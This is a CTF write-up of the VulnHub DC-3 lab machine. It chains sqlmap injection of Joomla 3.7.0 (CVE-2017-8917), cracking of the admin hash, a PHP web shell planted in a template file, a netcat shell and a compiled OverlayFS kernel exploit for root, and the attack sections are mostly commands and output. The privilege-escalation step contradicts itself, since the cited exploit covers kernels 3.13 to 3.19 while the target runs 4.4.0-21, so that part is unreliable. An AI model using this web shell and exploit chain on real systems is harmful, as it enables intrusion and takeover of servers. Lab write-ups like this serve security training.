CONFIDENTIAL 

**VulnHub DC-3 CTF Write-Up** 

## **VULNHUB** 

## **CTF PENETRATION TEST WRITE-UP** 

## Target Machine: DC-3  |  Difficulty: Intermediate 

Date: May 27, 2025  |  Author: Pavan Darade 

Page # 

Prepared by: Pavan Darade 

CONFIDENTIAL 

**VulnHub DC-3 CTF Write-Up** 

## **1. Executive Summary** 

DC-3 hosts a Joomla 3.7.0 CMS vulnerable to SQL injection (CVE-2017-8917). Exploitation yielded admin credentials, followed by uploading a PHP reverse shell. Root was obtained via a Linux kernel exploit (overlayfs privilege escalation). 

|**Machine Name**|DC-3|
|---|---|
|**Platform**|VulnHub|
|**OS**|Linux (Ubuntu 16.04)|
|**Difficulty**|Intermediate|
|**Flags Captured**|1 / 1  (Root Flag)|
|**Root Access**|Yes|
|**Test Date**|May 27, 2025|
|**Tester**|Pavan Darade|



## **2. Reconnaissance** 

## **2.1  Port Scanning** 

```
$ nmap -sV -sC -p- 192.168.56.104
80/tcp  open  http  Apache httpd 2.4.18 (Joomla)
```

## **2.2  CMS Fingerprinting** 

Joomscan identified the exact Joomla version as 3.7.0. 

```
$ joomscan -u http://192.168.56.104
```

```
[+] Joomla version: 3.7.0
```

## **3. Exploitation — CVE-2017-8917 (SQL Injection)** 

## **3.1  sqlmap Exploitation** 

Joomla 3.7.0 is vulnerable to a SQL injection in the com_fields component. sqlmap was used to extract the admin hash. 

```
$ sqlmap -u "http://192.168.56.104/index.php?
option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3
--level=5 --random-agent --dbs -p list[fullordering]
$ sqlmap [...] -D joomladb --tables
$ sqlmap [...] -D joomladb -T '#__users' --dump
[+] admin : $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
```

Page # 

Prepared by: Pavan Darade 

CONFIDENTIAL 

**VulnHub DC-3 CTF Write-Up** 

## **3.2  Hash Cracking** 

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
[+] Cracked: snoopy
```

## **3.3  PHP Reverse Shell Upload** 

Admin access to Joomla was used to edit a template PHP file and inject a reverse shell. 

```
Admin Panel > Extensions > Templates > Beez3 > error.php
Injected: <?php system($_GET['cmd']); ?>
$ curl http://192.168.56.104/templates/beez3/error.php?cmd=id
uid=33(www-data) gid=33(www-data)
```

## **3.4  Stable Shell via netcat** 

```
$ nc -lvnp 4444
```

```
[shell payload triggered via curl]
```

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## **4. Privilege Escalation — Kernel Exploit** 

## **4.1  Kernel Version Check** 

```
$ uname -a
```

```
Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP
```

## **4.2  OverlayFS Local Privilege Escalation** 

The kernel version 4.4.0-21 is vulnerable to CVE-2015-1328 (OverlayFS LPE). The exploit was compiled and executed on the target. 

```
$ searchsploit overlayfs
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - overlayfs LPE |
37292.c
$ gcc 37292.c -o exploit && ./exploit
root@DC-3:/# id
uid=0(root) gid=0(root) groups=0(root)
FLAG: flag{d6160ce303...} — /root/the-flag.txt
```

Page # 

Prepared by: Pavan Darade 

CONFIDENTIAL 

**VulnHub DC-3 CTF Write-Up** 

## **5. Flag Summary** 

|**Flag**|**Location**|**Method**|**Difficulty**|
|---|---|---|---|
|Root Flag|/root/the-flag.txt|OverlayFS kernel exploit|Hard|



## **6. Vulnerability Summary** 

|**Vulnerability**|**Description**|**CVSS**|**Severity**|
|---|---|---|---|
|CVE-2017-8917|Joomla 3.7.0 SQLi in com_fields component|9.8|Critical|
|CVE-2015-1328|Linux kernel OverlayFS privilege escalation|7.8|High|
|Weak Admin<br>Password|Admin hash cracked via rockyou.txt|7.5|High|
|Template File Write|Admin panel allows arbitrary PHP upload|8.1|High|



## **7. Recommendations** 

- Upgrade Joomla immediately to the latest stable version. 

- Apply OS and kernel patches — keep Ubuntu fully updated. 

- Enforce strong passwords and enable 2FA on CMS admin accounts. 

- Restrict template editing in the Joomla admin panel. 

- Implement a WAF to detect and block SQL injection attempts. 

## **8. Tools & References** 

- Nmap, Joomscan, sqlmap — Recon and exploitation 

- John the Ripper — Password hash cracking 

- Exploit-DB (37292.c) — OverlayFS kernel exploit 

- CVE-2017-8917 — https://nvd.nist.gov/vuln/detail/CVE-2017-8917 

- VulnHub DC-3 — https://www.vulnhub.com/entry/dc-32,312/ 

## **9. Disclaimer** 

This write-up was created solely for educational purposes as part of a CTF exercise on VulnHub. All testing was conducted in an isolated lab environment. Do not use these techniques against systems without explicit written authorisation. 

Page # 

Prepared by: Pavan Darade 

CONFIDENTIAL 

**VulnHub DC-3 CTF Write-Up** 

_End of Report — VulnHub DC-3 CTF Write-Up — Pavan Darade_ 

Page # 

Prepared by: Pavan Darade 

